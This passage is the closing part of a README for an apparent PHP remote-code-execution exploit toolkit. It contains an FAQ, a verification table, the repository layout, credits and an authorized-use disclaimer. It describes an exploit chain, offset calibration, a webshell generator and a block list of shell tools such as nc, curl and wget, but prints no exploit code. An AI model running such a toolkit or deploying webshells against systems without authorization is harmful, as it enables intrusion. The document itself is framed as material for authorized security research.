`detect` + `preflight` modes are for — run them first.
</details>

<details>
<summary><b>Why is there no reverse shell mode?</b></summary>

Deliberate. This is a **proof-of-access** toolkit: it proves code execution with
identity commands (`id`, `whoami`) and refuses to become an attack appliance —
`sh`, `bash`, `nc`, `curl`, `wget`, `chmod`, `rm` are blocked at runner level
and cannot be enabled by any flag. For benign persistence testing there is the
password-protected `shell` generator (bcrypt, TTL, whitelist, never auto-uploads).
</details>

<details>
<summary><b>Can I add custom commands?</b></summary>

Yes, within the fence: `--allow-cmd ls --allow-cmd df` extends the whitelist to
a fixed, reviewed set (`uname`, `hostname`, `pwd`, `ls`, `cat`, `df`, `uptime`,
`who`, `w`, `env`). Arbitrary binaries and chaining (`;`, `|`, `$(`, backticks)
remain impossible.
</details>

<details>
<summary><b>The exploit fails with HEAP_LEAK_FAILED — is the target patched?</b></summary>

Not necessarily. It usually means the target's build isn't calibrated (different
distro compile, different version). Measure the target's `libphp.so` and pass
the offsets manually. See "The 5 lab requirements".
</details>

<details>
<summary><b>Is using this legal?</b></summary>

Use on systems you **own** or have **written authorization** to test. Scanning
or exploiting third-party systems is a crime in most jurisdictions (UU ITE,
Computer Fraud and Abuse Act, etc.). The tool's design (14-byte identity
commands, no shells, no exfil primitives) reflects that scope.
</details>

---

## ❖ Verification

| Claim | Evidence |
|---|---|
| RCE on official `php:8.4.26-apache` | reproducible `PROOF: uid=33(www-data)`, incl. single-attempt runs |
| Chain engine ≡ reference exploit | byte-level diff — 7 core functions, constants, orchestration identical |
| Patched 8.4.27 refuses the chain | consumer runs stay clean on the patched regression lab |
| Command fence | 16 negative test cases, rejected **before** any network I/O |
| `--revshell` | blocked at runner level (exit 2), not just parser |
| Multi-target mode | dedupe, auto-https, JSON/CSV verified live |
| 133 unit tests | `python -m unittest discover -s tests -t .` → OK |

---

## ❖ Repository layout

> 📘 **Usage guide:** [`docs/TUTORIAL.md`](docs/TUTORIAL.md) — a step-by-step
> tutorial for every feature (all of them tested live), including
> RCE → up-shell. Technical runbook: [`docs/RUNBOOK_RCE_UPSHELL.md`](docs/RUNBOOK_RCE_UPSHELL.md).

```text
php2shell/
├── php2shell.py          single CLI: scan/detect/preflight/exploit/shell
├── install.sh            one-shot installer (venv + deps + smoke tests)
├── requirements.txt      curl_cffi, bcrypt
├── lib/
│   ├── chain.py          ── THE ENGINE: pure-python exploit chain (in-process)
│   ├── transport.py      curl_cffi JA3 transport + rate limit + audit log
│   ├── detect.py         fingerprint: version, SAPI, upload_progress…
│   ├── preflight.py      readiness score; detection ≠ gate
│   ├── build_support.py  RCE / leak-only / unproven table per build
│   ├── memprobe.py       read the target memory_limit through 1 request
│   ├── exploit_runner.py orchestration + command fence + auto-proof
│   ├── reporter.py       JSON / CSV / terminal tables
│   └── banner.py         the skull ASCII
├── shell/                password-protected webshell GENERATOR
├── lab/lab_docker.sh     author-config vulnerable lab, one command
├── docker/               php.ini / apache.conf / www / offsets.py
├── docs/                 SYARAT_TARGET.md — what makes the chain work
├── tests/                133 unit tests
└── gambar/               screenshot
```

---

## ❖ Disclaimer — authorized use only

<div align="center">

This tool publishes **defense-relevant reproduction** of two **already-patched**
PHP vulnerabilities for research, blue-team validation, and patch-verification.
Use it **only** on systems you own or have written authorization to test.

Exploiting third-party systems without authorization is a crime
(UU ITE Indonesia, US CFAA, EU equivalents).

The design (identity-only commands, no shell primitives, no exfiltration)
is intentional — this toolkit proves impact; it does not weaponize beyond proof.

**See [SECURITY.md](SECURITY.md) · License: [GPL-3.0-only](LICENSE)**

</div>

---

<div align="center">
<sub><b>CVE discoverers:</b> Calif (Ryan A.) — first finding 1 Aug 2026, reported 11 Aug ·
Wiz Research — independent finding 19 Aug 2026 ·
OpenAI Codex Security (Amy Burnett) — additional vector, reported 18 Sep 2026<br>
<b>Code &amp; research this builds on:</b> 9bie (Qi Deng) — public exploit &amp; heap grooming ·
Karasawa2025 — the <code>display_errors=Off</code> direction ·
v.dir.mir — <code>--revshell</code> in the reference ·
Zer061 — the reference <code>exploit.py</code> fork ·
ikow — OOM verifier ·
devploit — the 13 heap profile table<br>
<b>Advisories &amp; fixes:</b> PHP Group — GHSA-w8hw-w9fx-j79w / GHSA-6wmf-4rv5-p3rp<br>
reproduction, tooling &amp; hardening by <b>aarsaputra</b><br>
<sub>A credit missing or wrong? Open an issue.</sub></sub>
</div>